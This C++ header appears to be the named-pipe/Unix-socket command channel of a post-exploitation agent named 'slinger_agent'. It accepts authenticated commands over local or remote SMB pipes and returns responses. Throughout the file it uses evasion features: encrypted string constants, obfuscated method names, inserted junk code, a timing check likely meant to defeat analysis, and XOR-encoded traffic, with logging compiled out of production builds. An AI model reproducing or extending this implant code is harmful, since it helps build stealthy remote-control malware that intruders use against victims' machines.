#pragma once
#include "obfuscation.h"
#include "auth_protocol.h"
#include <string>
#include <vector>
#include <memory>
#include <functional>

// Cross-platform compatibility layer
#ifdef _WIN32
    #include <windows.h>
#else
    #include <sys/socket.h>
    #include <sys/un.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <cstring>
    #include <errno.h>
#endif

namespace obf = obfuscated;

// Obfuscated pipe-related strings (cross-platform)
#ifdef _WIN32
constexpr auto PIPE_PREFIX = OBF_STRING("\\\\.\\pipe\\");
#else
constexpr auto PIPE_PREFIX = OBF_STRING("/tmp/");
#endif
constexpr auto AGENT_PIPE_NAME = OBF_STRING("slinger_agent_");
// Generate handshake from random bytes - no static string
constexpr auto ACK_MSG = OBF_STRING("ACK");
constexpr auto CMD_PREFIX = OBF_STRING("CMD:");
constexpr auto RESP_PREFIX = OBF_STRING("RESP:");
constexpr auto EXIT_CMD = OBF_STRING("EXIT");

// Command and response structure
struct PipeMessage {
    uint32_t length;
    uint32_t type;
    std::vector<char> data;

    enum MessageType {
        COMMAND = 0x1001,
        RESPONSE = 0x1002,
        HANDSHAKE = 0x1003,
        HEARTBEAT = 0x1004
    };
};

class PipeCore {
private:
#ifdef _WIN32
    HANDLE pipe_handle;
#else
    int socket_fd;
    int client_fd;
    struct sockaddr_un server_addr;
#endif
    std::string pipe_name;
    std::string pipe_path;  // Store full pipe path for recreation
    bool is_connected;
    bool is_authenticated;
    obf::XOREncoder encoder;
    crypto::AuthProtocol auth;

    // Obfuscated method names
    bool OBF_FUNC_NAME(create_named_pipe)(const std::string& name);
    bool OBF_FUNC_NAME(connect_to_pipe)(const std::string& name);
#ifdef _WIN32
    bool OBF_FUNC_NAME(write_raw_data)(const void* data, DWORD size);
    bool OBF_FUNC_NAME(read_raw_data)(void* buffer, DWORD size, DWORD* bytes_read);
#else
    bool OBF_FUNC_NAME(write_raw_data)(const void* data, size_t size);
    bool OBF_FUNC_NAME(read_raw_data)(void* buffer, size_t size, size_t* bytes_read);
#endif

public:
    PipeCore();
    ~PipeCore();

    // Main interface methods
    bool initialize(const std::string& base_name);
    bool initialize_with_passphrase(const std::string& base_name, const char* passphrase, const char* agent_id);
    bool wait_for_connection();
    bool perform_authentication();
    bool send_message(const PipeMessage& message);
    bool receive_message(PipeMessage& message);
    std::string read_command();
    bool send_response(const std::string& response);
    void disconnect_client();
    void cleanup();
    bool is_pipe_connected() const { return is_connected; }
    bool is_pipe_authenticated() const { return is_authenticated; }
};

// Implementation
PipeCore::PipeCore() :
#ifdef _WIN32
    pipe_handle(INVALID_HANDLE_VALUE),
#else
    socket_fd(-1), client_fd(-1),
#endif
    is_connected(false),
    is_authenticated(false),
    encoder(obf::compile_seed()) {  // Use deterministic seed for XOR key
    obf::insert_junk_code();
#ifdef POSIX_BUILD
    memset(&server_addr, 0, sizeof(server_addr));
#endif
}

PipeCore::~PipeCore() {
    cleanup();
}

bool PipeCore::OBF_FUNC_NAME(create_named_pipe)(const std::string& name) {
    obf::insert_junk_code();

#ifdef _WIN32
    auto full_name = PIPE_PREFIX.decrypt() + name;
    pipe_path = full_name;  // Store for later recreation
    obf::StackString<256> pipe_path_str(full_name.c_str());

    // First check if pipe already exists by trying to open it
    HANDLE test_handle = CreateFileA(
        pipe_path_str.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (test_handle != INVALID_HANDLE_VALUE) {
        // Pipe already exists - another instance is running
        CloseHandle(test_handle);
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("PIPE", "Pipe already exists: " + pipe_path);
            DEBUG_LOG_CAT("ERROR", "Another agent instance may be running with the same pipe name");
            DEBUG_LOG_CAT("ERROR", "Exiting to avoid conflicts");
        #endif
        return false;
    }

    // Pipe doesn't exist, create it
    pipe_handle = CreateNamedPipeA(
        pipe_path_str.c_str(),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, // Single instance only - prevents stale handles across reconnections
        4096, // Out buffer size
        4096, // In buffer size
        0, // Default timeout
        NULL // Security attributes
    );

    if (pipe_handle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("ERROR", "CreateNamedPipe failed with error: " + std::to_string(error));
        #endif
        return false;
    }

    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("PIPE", "Successfully created pipe: " + pipe_path);
    #endif

    return true;
#else
    // Linux stub - create a simple socket for testing
    socket_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (socket_fd == -1) return false;

    auto full_name = PIPE_PREFIX.decrypt() + name;
    strncpy(server_addr.sun_path, full_name.c_str(), sizeof(server_addr.sun_path) - 1);
    server_addr.sun_family = AF_UNIX;

    // Remove existing socket file
    unlink(full_name.c_str());

    // Bind socket
    if (bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        close(socket_fd);
        socket_fd = -1;
        return false;
    }

    // Listen for connections
    if (listen(socket_fd, 1) == -1) {
        close(socket_fd);
        socket_fd = -1;
        return false;
    }

    return true;
#endif
}

bool PipeCore::initialize(const std::string& base_name) {
    if (!obf::check_timing()) return false;

    // Use custom pipe name if defined, otherwise generate unique pipe name
    #ifdef CUSTOM_PIPE_NAME
        pipe_name = std::string(CUSTOM_PIPE_NAME);
    #else
        // Generate unique pipe name with timestamp and suffix
        #ifdef _WIN32
            auto timestamp = std::to_string(GetTickCount64());
        #else
            auto timestamp = std::to_string(time(nullptr));
        #endif
        auto unique_suffix = std::to_string(obf::random_seed() % 9999);
        pipe_name = base_name + timestamp + "_" + unique_suffix;
    #endif

    return OBF_FUNC_NAME(create_named_pipe)(pipe_name);
}

bool PipeCore::initialize_with_passphrase(const std::string& base_name, const char* passphrase, const char* agent_id) {
    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("INIT", "Initializing pipe with passphrase authentication");
    #endif

    if (!initialize(base_name)) {
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("INIT", "Failed to initialize pipe");
        #endif
        return false;
    }

    // Initialize authentication with passphrase
    // This hashes the passphrase and stores SHA256(passphrase) in the agent
    if (!auth.initialize_with_passphrase(passphrase)) {
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("INIT", "Failed to initialize authentication");
        #endif
        cleanup();
        return false;
    }

    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("INIT", "Pipe and authentication initialized successfully");
    #endif

    return true;
}

bool PipeCore::wait_for_connection() {
#ifdef _WIN32
    if (pipe_handle == INVALID_HANDLE_VALUE) return false;

    obf::insert_junk_code();

    BOOL connected = ConnectNamedPipe(pipe_handle, NULL);
    DWORD error = GetLastError();
    if (!connected && error != ERROR_PIPE_CONNECTED) {
        // Log error for debugging (in production, this would be silent)
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("PIPE", "ConnectNamedPipe failed with error: " + std::to_string(error));
        #endif
        if (error == ERROR_PIPE_LISTENING) {
            // Pipe is in listening state, this is actually OK
            connected = TRUE;
        } else if (error == ERROR_NO_DATA) {
            // ERROR_NO_DATA (232) after disconnect means pipe is in bad state
            // Need to close and recreate the pipe handle
            #ifdef DEBUG_MODE
                DEBUG_LOG_CAT("PIPE", "Pipe in bad state (ERROR_NO_DATA), recreating...");
            #endif
            CloseHandle(pipe_handle);

            // Recreate the pipe with SAME settings as initial creation
            pipe_handle = CreateNamedPipeA(
                pipe_path.c_str(),
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,  // Must match initial creation!
                1,     // Single instance - prevents stale handles across reconnections
                4096,  // Output buffer size
                4096,  // Input buffer size
                0,     // Default timeout
                NULL   // Default security
            );

            if (pipe_handle == INVALID_HANDLE_VALUE) {
                #ifdef DEBUG_MODE
                    DEBUG_LOG_CAT("PIPE", "Failed to recreate pipe handle");
                #endif
                return false;
            }

            // Now try to connect again
            connected = ConnectNamedPipe(pipe_handle, NULL);
            if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
                return false;
            }
            connected = TRUE;
        } else {
            return false;
        }
    }

    is_connected = true;
    is_authenticated = false;  // Reset auth status for new connection

    // Send handshake
    auto handshake = ACK_MSG.decrypt();
    return send_response(handshake);
#else
    if (socket_fd == -1) return false;

    obf::insert_junk_code();

    // Accept connection
    socklen_t len = sizeof(server_addr);
    client_fd = accept(socket_fd, (struct sockaddr*)&server_addr, &len);
    if (client_fd == -1) return false;

    is_connected = true;
    is_authenticated = false;  // Reset auth status for new connection

    // Send handshake
    auto handshake = ACK_MSG.decrypt();
    return send_response(handshake);
#endif
}

bool PipeCore::perform_authentication() {
    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("AUTH", "Starting challenge-response authentication");
    #endif

    // Create lambda wrappers for send/receive raw bytes
    auto send_raw = [this](const void* data, size_t size) -> bool {
        #ifdef _WIN32
            return this->OBF_FUNC_NAME(write_raw_data)(data, static_cast<DWORD>(size));
        #else
            return this->OBF_FUNC_NAME(write_raw_data)(data, size);
        #endif
    };

    auto read_raw = [this](void* buffer, size_t size) -> bool {
        #ifdef _WIN32
            DWORD bytes_read = 0;
            if (!this->OBF_FUNC_NAME(read_raw_data)(buffer, static_cast<DWORD>(size), &bytes_read)) {
                return false;
            }
            return bytes_read == static_cast<DWORD>(size);
        #else
            size_t bytes_read = 0;
            if (!this->OBF_FUNC_NAME(read_raw_data)(buffer, size, &bytes_read)) {
                return false;
            }
            return bytes_read == size;
        #endif
    };

    // Perform authentication (sends nonce, receives HMAC, verifies, derives key)
    if (!auth.authenticate_as_agent(send_raw, read_raw)) {
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("AUTH", "Authentication FAILED");
        #endif
        return false;
    }

    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("AUTH", "Authentication SUCCESS - session encrypted");
    #endif

    is_authenticated = true;
    return true;
}

#ifdef _WIN32
bool PipeCore::OBF_FUNC_NAME(write_raw_data)(const void* data, DWORD size) {
    if (!is_connected) {
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("PIPE_WRITE", "Write failed: pipe not connected");
        #endif
        return false;
    }

    DWORD bytes_written = 0;
    BOOL result = WriteFile(pipe_handle, data, size, &bytes_written, NULL);

    #ifdef DEBUG_MODE
        if (!result) {
            DWORD error = GetLastError();
            DEBUG_LOG_CAT("PIPE_WRITE", "WriteFile failed with error: " + std::to_string(error));
        } else if (bytes_written != size) {
            DEBUG_LOG_CAT("PIPE_WRITE", "Partial write: " + std::to_string(bytes_written) + "/" + std::to_string(size));
        } else {
            DEBUG_LOG_CAT("PIPE_WRITE", "WriteFile success: " + std::to_string(bytes_written) + " bytes");
        }
    #endif

    return result && bytes_written == size;
}

bool PipeCore::OBF_FUNC_NAME(read_raw_data)(void* buffer, DWORD size, DWORD* bytes_read) {
    if (!is_connected) return false;

    // Poll for data with timeout (important for remote SMB pipe access)
    // Remote clients may have network latency and users need time to type commands
    const int MAX_WAIT_MS = 60000;  // 60 second timeout for interactive use
    const int POLL_INTERVAL_MS = 50;  // Check every 50ms
    int elapsed = 0;

    while (elapsed < MAX_WAIT_MS) {
        DWORD bytes_available = 0;
        if (!PeekNamedPipe(pipe_handle, NULL, 0, NULL, &bytes_available, NULL)) {
            // Connection broken - log ONCE and return
            #ifdef DEBUG_MODE
                DEBUG_LOG_CAT("PIPE_READ", "Connection broken during read");
            #endif
            return false;
        }

        if (bytes_available > 0) {
            // Data is available, read it
            BOOL result = ReadFile(pipe_handle, buffer, size, bytes_read, NULL);
            return result && (*bytes_read > 0);
        }

        // No data yet, wait and retry (no logging in loop to prevent spam)
        Sleep(POLL_INTERVAL_MS);
        elapsed += POLL_INTERVAL_MS;
    }

    // Timeout - log once
    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("PIPE_READ", "Read timeout after 60 seconds");
    #endif
    *bytes_read = 0;
    return false;
}
#else
bool PipeCore::OBF_FUNC_NAME(write_raw_data)(const void* data, size_t size) {
    if (!is_connected) return false;

    ssize_t bytes_written = write(client_fd, data, size);
    return bytes_written == (ssize_t)size;
}

bool PipeCore::OBF_FUNC_NAME(read_raw_data)(void* buffer, size_t size, size_t* bytes_read) {
    if (!is_connected) return false;

    ssize_t result = read(client_fd, buffer, size);
    if (result >= 0) {
        *bytes_read = result;
        return true;
    }
    return false;
}
#endif

bool PipeCore::send_message(const PipeMessage& message) {
    if (!is_connected) {
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("PIPE_MSG", "send_message failed: not connected");
        #endif
        return false;
    }

    obf::insert_junk_code();

    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("PIPE_MSG", "Sending message: type=" + std::to_string(message.type) + " length=" + std::to_string(message.length));
    #endif

    // Send header
    uint32_t header[2] = {message.length, message.type};
    if (!OBF_FUNC_NAME(write_raw_data)(header, sizeof(header))) {
        #ifdef DEBUG_MODE
            DEBUG_LOG_CAT("PIPE_MSG", "Failed to send message header");
        #endif
        return false;
    }

    // Send data
    if (message.length > 0) {
        bool result = OBF_FUNC_NAME(write_raw_data)(message.data.data(), message.length);
        #ifdef DEBUG_MODE
            if (!result) {
                DEBUG_LOG_CAT("PIPE_MSG", "Failed to send message data");
            } else {
                DEBUG_LOG_CAT("PIPE_MSG", "Message sent successfully");
            }
        #endif
        return result;
    }

    #ifdef DEBUG_MODE
        DEBUG_LOG_CAT("PIPE_MSG", "Empty message sent successfully");
    #endif

    return true;
}

bool PipeCore::receive_message(PipeMessage& message) {
    if (!is_connected) return false;

    // Read header
    uint32_t header[2];
#ifdef _WIN32
    DWORD bytes_read = 0;
#else
    size_t bytes_read = 0;
#endif
    if (!OBF_FUNC_NAME(read_raw_data)(header, sizeof(header), &bytes_read) ||
        bytes_read != sizeof(header)) {
        // Connection broken - mark as disconnected to stop the command loop
        is_connected = false;
        is_authenticated = false;
        return false;
    }

    message.length = header[0];
    message.type = header[1];

    // Read data
    if (message.length > 0) {
        message.data.resize(message.length);
        if (!OBF_FUNC_NAME(read_raw_data)(message.data.data(), message.length, &bytes_read) ||
            bytes_read != message.length) {
            // Connection broken - mark as disconnected
            is_connected = false;
            is_authenticated = false;
            return false;
        }
    }

    return true;
}

std::string PipeCore::read_command() {
    if (!is_connected) return "";

    PipeMessage message;
    if (!receive_message(message)) {
        return "";
    }

    if (message.type != PipeMessage::COMMAND) {
        return "";
    }

    std::string command(message.data.begin(), message.data.end());

    // Decrypt if authenticated, otherwise just decode XOR
    if (is_authenticated && auth.is_authenticated()) {
        std::string decrypted;
        if (!auth.decrypt_message(command, decrypted)) {
            return "";
        }
        return decrypted;
    } else {
        return encoder.decode(command);
    }
}

bool PipeCore::send_response(const std::string& response) {
    if (!is_connected) return false;

    std::string processed_response;

    // Encrypt if authenticated, otherwise just encode with XOR
    if (is_authenticated && auth.is_authenticated()) {
        if (!auth.encrypt_message(response, processed_response)) {
            return false;
        }
    } else {
        processed_response = encoder.encode(response);
    }

    PipeMessage message;
    message.type = PipeMessage::RESPONSE;
    message.length = static_cast<uint32_t>(processed_response.length());
    message.data.assign(processed_response.begin(), processed_response.end());

    return send_message(message);
}

void PipeCore::disconnect_client() {
#ifdef _WIN32
    if (pipe_handle != INVALID_HANDLE_VALUE && is_connected) {
        // Flush any pending writes before disconnecting
        FlushFileBuffers(pipe_handle);

        // DisconnectNamedPipe clears pipe buffers and allows handle reuse
        // Client must close and reopen to get fresh connection
        DisconnectNamedPipe(pipe_handle);

        is_connected = false;
        is_authenticated = false;

        // CRITICAL: Reset authentication state and clear session keys
        // This ensures fresh keys are used on reconnect
        auth.reset();
    }
#else
    if (client_fd != -1) {
        close(client_fd);
        client_fd = -1;
        is_connected = false;
        is_authenticated = false;

        // CRITICAL: Reset authentication state and clear session keys
        auth.reset();
    }
#endif
}

void PipeCore::cleanup() {
#ifdef _WIN32
    if (pipe_handle != INVALID_HANDLE_VALUE) {
        DisconnectNamedPipe(pipe_handle);
        CloseHandle(pipe_handle);
        pipe_handle = INVALID_HANDLE_VALUE;
    }
#else
    if (client_fd != -1) {
        close(client_fd);
        client_fd = -1;
    }
    if (socket_fd != -1) {
        close(socket_fd);
        socket_fd = -1;
        // Remove socket file
        if (!pipe_name.empty()) {
            auto full_name = PIPE_PREFIX.decrypt() + pipe_name;
            unlink(full_name.c_str());
        }
    }
#endif
    is_connected = false;

    // Clear sensitive data
    pipe_name.clear();
    obf::insert_junk_code();
}
